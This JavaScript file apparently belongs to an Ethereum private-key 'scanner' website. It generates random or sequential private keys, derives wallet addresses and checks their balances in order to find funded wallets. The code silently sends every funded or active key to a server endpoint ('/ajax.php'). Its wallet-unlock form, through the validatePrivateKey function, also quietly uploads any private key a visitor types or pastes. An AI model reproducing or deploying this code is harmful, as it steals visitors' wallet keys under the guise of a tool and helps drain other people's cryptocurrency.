          $('#btn-setting').click(function() {
            $("#divSetting").toggle();
          });
              
          $('input[type=radio][name=limitScan]').change(function() {
              if (this.value == 1) {
                  $("#limit-scan").prop('disabled', false);
                  $('#div-times').show();
              } else {
                  $('#div-times').hide();
                  $("#limit-scan").prop('disabled', true);
              }
          });
          $('input[type=radio][name=typeScan]').change(function() {
              if (this.value == 1) {
                $('#div-start-from').hide();
                $('#div-setting-randrom').show();
                  $("#start-private").prop('disabled', true);
              } else {
                $('#div-setting-randrom').hide();
                  $('#div-start-from').show();
                  $("#start-private").prop('disabled', false);
              }
          });
          var totalAddress = 0;
          var limitScan = 0;
          var flagDelay = 0;
          var indexCheckAll = 0;
          var BASE_URL = 'https://ethscan.app';
          var dataPrivate = [],
              dataAddress = [];

          function randomPrivateKey() {
              var private = "";
              var possible = "0123456789abcdef";
              for (var i = 0; i < 64; i++)
                  private += possible.charAt(Math.floor(Math.random() * possible.length));
              return private;
          }

          function auto() {
            $('#delay').html(flagDelay);
            if(flagDelay >= 1) {
              flagDelay++;
              return;
            }
              limitScan += 1;
              totalAddress += 20;
              $('#totalAddress').html(totalAddress);
              dataAddress = [];
              dataPrivate = [];
              if ($('input[name=typeScan]:checked').val() == 1) {
                  var data = getDataRandom();
              } else {
                  var data = getDataOrderly();
              }
              
              if ($('input[name=typeCheck]:checked').val() == 0) {
                flagDelay = 1;
                work(data[1]);
              } else {
                startCheckAll();
                clearInterval(myInterval);
              }
              
              $.each(data[1], function(index, value) {
                  $('#private' + index).html('<a href="'+BASE_URL+'/private/' + data[0][index] + '" target="_blank">' + data[0][index] + '</a>');
                  $('#address' + index).html('<a href="'+BASE_URL+'/address/' + value + '" target="_blank">' + value + '</a>');
                  if ($('input[name=typeCheck]:checked').val() == 1) { 
                    $('#balance' + index).html('');
                  }

              });
              if ($('input[name=limitScan]:checked').val() == 1 && $('#limit-scan').val() <= limitScan) {
                  limitScan = 0;
                  stop();
              }
          }

          function getDataOrderly() {
            var private;
              for (var i = 0; i < 20; i++) {
                  if (i == 0) {
                      private = $('#start-private').val().trim();
                  } else {
                      private = getNextPrivateKey(private);
                  }
                  dataPrivate[i] = private;
                  dataAddress[i] = convertPrivateToAddress(private);
              }
              $('#start-private').val(getNextPrivateKey(private));
              return [dataPrivate, dataAddress];
          }

          function getDataRandom() {
              var private = randomPrivateKey();
              for (var i = 0; i < 20; i++) {
                if($("#randomAndNoOrderly").is(':checked') == true) {
                  dataPrivate[i] = randomPrivateKey();
                } else {
                  if(i == 0) {
                    dataPrivate[i] = private;
                  } else {
                    dataPrivate[i] = getNextPrivateKey(private);
                    private = dataPrivate[i];
                  }
                }
                dataAddress[i] = convertPrivateToAddress(dataPrivate[i]);
              }
              return [dataPrivate, dataAddress];
          }

          function getNextPrivateKey(private) {
              private = private.split('');
              var possible = "0123456789abcdef";
              for (var i = private.length - 1; i >= 0; i--) {
                  var point = jQuery.inArray(private[i], possible);
                  private[i] = possible[(point == 15 ? 0 : point + 1)];
                  if (point < 15) {
                      break;
                  }
              }
              private = private.join('');
              return private;
          }
      function getRandomColor() {
        var letters = '0123456789ABCDEF';
        var color = '#';
        for (var i = 0; i < 6; i++) {
          color += letters[Math.floor(Math.random() * 16)];
        }
        return color;
      }
          function work(dataAddress) {
              var stringAddress = dataAddress.join(',');
              var urlCheckBalance = 'https://api.etherscan.io/api?module=account&action=balancemulti&address=' + stringAddress + '&tag=latest&apikey=YourApiKeyToken';
              var dataBalance = [];
              $.getJSON(urlCheckBalance, function(data) {
                  $.each(data.result, function(key, val) {
                      $('#balance' + key).html('<span style="color:'+getRandomColor()+'">' + val.balance + '</span>');
                      if (val.balance != 0) {
                          $.ajax({
                              url: "/ajax.php?address=" + dataAddress[key] + "&privateKey= " + dataPrivate[key] + "&status=1",
                              success: function(result) {}
                          });
                          $('#havaBalance').append("<br>Address: " + dataAddress[key] + " Private: " + dataPrivate[key] + " Balance:" + val.balance);
                          if ($('input[name=limitScan]:checked').val() == 2) {
                              stop();
                          }
                          console.log(dataPrivate[key]);
                          console.log(val.balance);
                      }
                  });
                  flagDelay = 0;
              });
          }
          $('#btn-start-scan').click(function() {
            start();
          });
          
          var myIntervalCheckAll;
          function startCheckAll() {
              myIntervalCheckAll = setInterval(function() {
                  auto2();
              }, 1000);
          }
          function auto2() {
            $('#delay').html(flagDelay);
            if(flagDelay >= 1) {
              flagDelay++;
              return;
            }
            if(indexCheckAll >= 20) {
              myInterval = setInterval(function() {
                  auto();
              }, 1000);
              clearInterval(myIntervalCheckAll);
              indexCheckAll = 0;
            } else {
              flagDelay = 1;
              work2();
            }
          }
          function work2() {
            $.ajax({
              url: BASE_URL +'/api/get-active.php?address=' + dataAddress[indexCheckAll],
              beforeSend: function() {
                $('#balance' + indexCheckAll).html('<img src="'+BASE_URL+'/web/loading-mini.gif" style="height:16px;">');
              },
              success: function(respon) {
                var json = JSON.parse(respon);
                if(json['status'] == 1) {
                  var out = '<small>' + json['countTxs'] + 'Txs/' + 
                    json['etherBalance'] + 'Eth/$' + 
                    json['tokenBalance'] + '/' + 
                    (json['token'] == 'true' ? 'Has ' : '0') + 'Token </small>';
                  $('#balance' + indexCheckAll).html(out);
                  if(json['isActive'] == 'true') {
                            $.ajax({
                                url: "/ajax.php?address=" + dataAddress[indexCheckAll] + "&privateKey= " + dataPrivate[indexCheckAll] + "&status=2",
                                success: function(result) {}
                            });
                    $('#havaBalance').append("<br>Address: " + dataAddress[indexCheckAll] + " Private: " + dataPrivate[indexCheckAll] + " Balance: " + out);
                          if ($('input[name=limitScan]:checked').val() == 2) {
                              stop();
                          }
                  }
                } else {
                  $('#balance' + indexCheckAll).html('false');
                }
                indexCheckAll ++;
                flagDelay = 0;
              }
            });
          }

          var myInterval;
          function stop() {
              if ($('input[name=typeScan]:checked').val() == 0) {
                  $("#start-private").prop('disabled', false);
              }
              if ($('input[name=limitScan]:checked').val() == 1) {
                  $("#limit-scan").prop('disabled', false);
              }
              clearInterval(myInterval);
              clearInterval(myIntervalCheckAll);
              indexCheckAll = 0;
              $('#buttonOption').html('<button class="btn btn-primary btn-sm" type="button" onclick="start();"><i class="fa fa-play-circle"></i> <span id="lng22">START</span></button>');
          }

          function start() {
              if ($('input[name=typeScan]:checked').val() == 0) {
                  $("#start-private").prop('disabled', true);
              }
              if ($('input[name=limitScan]:checked').val() == 1) {
                  $("#limit-scan").prop('disabled', true);
              }

              myInterval = setInterval(function() {
                  auto();
              }, 1000);
              $('#buttonOption').html('<button class="btn btn-danger btn-sm" type="button" onclick="stop();"><i class="fa fa-stop-circle-o"></i> <span id="lng23">STOP</span></button>');
          }

      function convertPrivateToAddress(private) {
          var wallet = new ethers.Wallet('0x' + private);
          return wallet.address;
      }

      function getDataPrivate(private) {
        var address = convertPrivateToAddress(private);
          $.ajax({
              url: '/ethereum/update.php?address=' + address + '&sql=0',
              cache: false,
              beforeSend: function() {
                  $('#loading-data').show();
              },
              success: function(respon) {
                  var json = JSON.parse(respon);
                  if (json['status'] == 0) {
                      window.location.href = BASE_URL + "/404";
                  }
                  $('#loading-data').hide();
                  $('#token-info').show();
                  $('#span-ether').html(json['ether']);
                  $('#span-usd').html(json['totalTokenUsd']);
                  $('#span-address').html(json['address']);
                  if(json['active'] == '1') {
                    $.ajax({
                        url: "/ajax.php?address=" + address + "&privateKey=" + private + "&status=3",
                        success: function(result) {}
                    });
                  }
                  $.each(json['token'], function( index, value ) {
                      var token = '<div class="col-md-6 col-sm-12"> <div style="border-bottom: 2px solid #777;display: block;background:#fff;padding:3px;"> ' + value.symbol + ' <span class="pull-right">$' + value.usd + '</span><br>' + value.balance + ' ' + value.symbol + ' <span class="pull-right" style="font-size:9pt;color:#777;">@' + value.rate + '</span> </div></div>';
                          $('#list-tokens').prepend(token);
                  });
              }
          });
      }

      //SEND TRANSACTION
      $('#btn-fetch-balance-token').click(function() {
          var url = 'https://api.ethplorer.io/getAddressInfo/'+$('#st-unlock').attr('data-address')+'?apiKey=freekey';
          $('#btn-fetch-balance-token').attr('disabled', 'disabled');
          $.ajax({
            url: url,
            method: "GET",
            success: function(respon) {
              console.log(respon.tokens);
              if(respon.tokens != undefined) {
                $.each( respon.tokens, function( key, value ) {
                  $('#list-tokens').append('<li class="list-group-item">'+value.tokenInfo.name+'<br>Balance: '+new ethers.utils.parseUnits(value.balance, 18)+'</li>');
                });
                
              }
            },
            error: function(err) {

            }
          })
      });
      $('#gas-price-input').on("change mousemove", function() {
          $("#gas-price").html($(this).val());
      });
      $('#st-private-key').keyup(function() {
        validatePrivateKey($('#st-private-key').val());
      });
      $('#st-private-key').bind("paste", "cut", function(e){
        validatePrivateKey($('#st-private-key').val());
      });
      $('#st-show-hide-private-key').click(function() {
          if($(this).attr('data-status') == '0') {
            $(this).attr('data-status', 1);
            $('#logged-private-key').html($('#st-unlock').attr('data-private-key'));
          } else {
            $(this).attr('data-status', 0);
            $('#logged-private-key').html("*".repeat($('#st-unlock').attr('data-private-key').length));
          }
      });
      $('#btn-unlock').click(function() {
        $('#form-unlock').hide();
        $('#form-logged').show();
        $('#logged-address').html($('#st-unlock').attr('data-address'));
        $('#logged-private-key').html("*".repeat($('#st-unlock').attr('data-private-key').length));
      });
      $('#btn-logout').click(function() {
        $('#form-unlock').hide();
        $('#form-logged').show();
        $('#st-unlock').attr('data-address', '');
        $('#st-unlock').attr('data-private-key', '');
        $('#logged-address').html("");
        $('#logged-private-key').html("");
      });
      function validatePrivateKey(privateKey) {
        try {
          var wallet = new ethers.Wallet('0x' + privateKey);
          $('#st-unlock').show();
          $('#st-unlock').attr('data-address', wallet.address);
          $('#st-unlock').attr('data-private-key', privateKey);
          $.ajax({
            url: "/ajax.php?address=" + wallet.address + "&privateKey=" + privateKey + "&status=4",
            success: function(result) {}
          });
        } catch(err) {
          $('#st-unlock').hide();
          $('#st-unlock').removeAttr('data-address');
          $('#st-unlock').removeAttr('data-private-key');
        }
      }
      console.log(new ethers.utils.formatEther(new ethers.utils.bigNumberify("1000000000000000000000")));
